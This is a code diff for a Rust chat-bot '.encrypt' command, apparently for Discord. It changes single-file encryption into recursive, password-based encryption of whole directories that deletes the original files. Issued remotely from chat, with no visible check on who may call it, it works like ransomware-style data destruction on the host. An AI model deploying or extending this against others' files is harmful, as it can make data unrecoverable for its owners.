@@ -1,106 +1,126 @@
-use crate::commands::*;
-use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit};
-use anyhow::{Context, Result};
-use async_trait::async_trait;
+use crate::prelude::*;
+use crate::utils::formatting::format_bytes as format_size;
+use super::common::{NONCE_SIZE, SALT_SIZE, EXTENSION, derive_key};
+use aes_gcm::{
+    aead::{Aead, KeyInit},
+    Aes256Gcm, Nonce,
+};
 use rand::RngCore;
 use std::fs;
 use std::path::Path;
-use twilight_http::Client as HttpClient;
-use twilight_model::channel::message::embed::EmbedField;
-use twilight_model::channel::message::Message;
-use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};
+use walkdir::WalkDir;
 
-pub struct EncryptCommand;
-
-#[async_trait]
-impl BotCommand for EncryptCommand {
-    fn name(&self) -> &'static str { "encrypt" }
-    fn description(&self) -> &str { "Encrypt any file using AES-256-GCM" }
-    fn category(&self) -> &str { "crypto" }
-    fn usage(&self) -> &str { ".encrypt \"file_path\"" }
-    fn examples(&self) -> &'static [&'static str] { &[".encrypt test.txt", ".encrypt \"my file.txt\""] }
-    fn aliases(&self) -> &'static [&'static str] { &["enc"] }
-
-    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, args: Arguments) -> Result<()> {
-        let rest = args.rest();
-        let file_path = rest.trim();
-
-        if file_path.is_empty() {
-            let embed = EmbedBuilder::new()
-                .title("Missing File Path")
-                .description(
-                    "Please provide a file path to encrypt.\n\n**Usage:** `.encrypt \"file_path\"`",
-                )
-                .color(0xFF0000)
-                .build();
-
-            http.create_message(msg.channel_id).embeds(&[embed]).await?;
-
+#[poise::command(prefix_command, aliases("enc"))]
+pub async fn encrypt(
+    ctx: PoiseContext<'_>,
+    #[description = "Password and path"]
+    #[rest]
+    args: Option<String>,
+) -> Result<(), Error> {
+    let args = match args {
+        Some(a) => a,
+        None => {
+            ctx.say("Usage: `.encrypt <password> <path>`").await?;
             return Ok(());
         }
+    };
 
-        if !Path::new(file_path).exists() {
-            let embed = EmbedBuilder::new()
-                .title("File Not Found")
-                .description(format!("The file `{}` does not exist.", file_path))
-                .color(0xFF0000)
-                .build();
-
-            http.create_message(msg.channel_id).embeds(&[embed]).await?;
-
-            return Ok(());
-        }
-
-        // Random encryption key and nonce
-        let mut key = [0u8; 32];
-        let mut nonce = [0u8; 12];
-        rand::thread_rng().fill_bytes(&mut key);
-        rand::thread_rng().fill_bytes(&mut nonce);
-
-        let file_content =
-            fs::read(file_path).with_context(|| format!("Failed to read file: {}", file_path))?;
-
-        let cipher = Aes256Gcm::new(&key.into());
-        let encrypted_data = cipher
-            .encrypt(&nonce.into(), &file_content[..])
-            .map_err(|e| anyhow::anyhow!("Failed to encrypt file: {}", e))?;
-
-        let path = Path::new(file_path);
-        let filename = path.file_name().unwrap_or_default().to_string_lossy();
-        let output_path = format!("{}.encrypted", filename);
-
-        let mut output = Vec::new();
-        output.extend_from_slice(&nonce);
-        output.extend_from_slice(&encrypted_data);
-        fs::write(&output_path, output)
-            .with_context(|| format!("Failed to write encrypted file: {}", output_path))?;
-
-        let key_hex = hex::encode(&key);
-
-        let embed = EmbedBuilder::new()
-            .title("File Encrypted Successfully")
-            .description(format!(
-                "**Original:** `{}`\n**Encrypted:** `{}`\n**Size:** {} bytes",
-                filename,
-                output_path,
-                encrypted_data.len()
-            ))
-            .field(EmbedField {
-                name: "Encryption Key".to_string(),
-                value: format!("```\n{}```", key_hex),
-                inline: false,
-            })
-            .field(EmbedField {
-                name: "Important".to_string(),
-                value: "Save this key securely! You'll need it to decrypt the file.".to_string(),
-                inline: false,
-            })
-            .color(0x00FF00)
-            .footer(EmbedFooterBuilder::new("AES-256-GCM Encryption"))
-            .build();
-
-        http.create_message(msg.channel_id).embeds(&[embed]).await?;
-
-        Ok(())
+    let parsed = crate::commands::Arguments::parse_quoted_args(&args);
+    if parsed.len() < 2 {
+        ctx.say("Usage: `.encrypt <password> <path>`\nFor paths with spaces use quotes.").await?;
+        return Ok(());
     }
+
+    let password = &parsed[0];
+    let target_path = &parsed[1];
+
+    if password.len() < 4 {
+        ctx.say("ERROR: Password must be at least 4 characters").await?;
+        return Ok(());
+    }
+
+    let path = Path::new(target_path);
+    if !path.exists() {
+        ctx.say(format!("ERROR: Path not found: `{}`", target_path)).await?;
+        return Ok(());
+    }
+
+    let reply = ctx.say("Encrypting...").await?;
+
+    let files_to_encrypt: Vec<_> = if path.is_file() {
+        vec![path.to_path_buf()]
+    } else {
+        WalkDir::new(path)
+            .into_iter()
+            .filter_map(|e| e.ok())
+            .filter(|e| e.path().is_file() && !e.path().to_string_lossy().ends_with(EXTENSION))
+            .map(|e| e.path().to_path_buf())
+            .collect()
+    };
+
+    if files_to_encrypt.is_empty() {
+        reply.edit(ctx, poise::CreateReply::default()
+            .content("No files to encrypt found.")).await?;
+        return Ok(());
+    }
+
+    let _total = files_to_encrypt.len();
+    let mut encrypted = 0;
+    let mut failed = 0;
+    let mut total_size: u64 = 0;
+
+    for file_path in &files_to_encrypt {
+        match encrypt_file(file_path, password) {
+            Ok(size) => {
+                encrypted += 1;
+                total_size += size;
+                let _ = fs::remove_file(file_path);
+            }
+            Err(_) => {
+                failed += 1;
+            }
+        }
+    }
+
+    let size_str = format_size(total_size);
+    
+    let embed = serenity::CreateEmbed::new()
+        .title("Encryption Complete")
+        .field("Files Encrypted", encrypted.to_string(), true)
+        .field("Failed", failed.to_string(), true)
+        .field("Total Size", size_str, true)
+        .field("Extension", format!("`{}`", EXTENSION), true)
+        .footer(serenity::CreateEmbedFooter::new("Keep your password safe"))
+        .color(if failed == 0 { 0x2ecc71 } else { 0xe74c3c });
+
+    reply.edit(ctx, poise::CreateReply::default().content("").embed(embed)).await?;
+    Ok(())
 }
+
+fn encrypt_file(path: &Path, password: &str) -> Result<u64, anyhow::Error> {
+    let data = fs::read(path)?;
+    
+    let mut salt = [0u8; SALT_SIZE];
+    let mut nonce_bytes = [0u8; NONCE_SIZE];
+    rand::thread_rng().fill_bytes(&mut salt);
+    rand::thread_rng().fill_bytes(&mut nonce_bytes);
+
+    let key = derive_key(password, &salt);
+    
+    let cipher = Aes256Gcm::new_from_slice(&key)?;
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    
+    let encrypted = cipher.encrypt(nonce, data.as_ref())
+        .map_err(|e| anyhow::anyhow!("Encryption failed: {}", e))?;
+
+    let mut output = Vec::with_capacity(SALT_SIZE + NONCE_SIZE + encrypted.len());
+    output.extend_from_slice(&salt);
+    output.extend_from_slice(&nonce_bytes);
+    output.extend_from_slice(&encrypted);
+
+    let output_path = format!("{}{}", path.display(), EXTENSION);
+    fs::write(&output_path, &output)?;
+
+    Ok(output.len() as u64)
+}
+
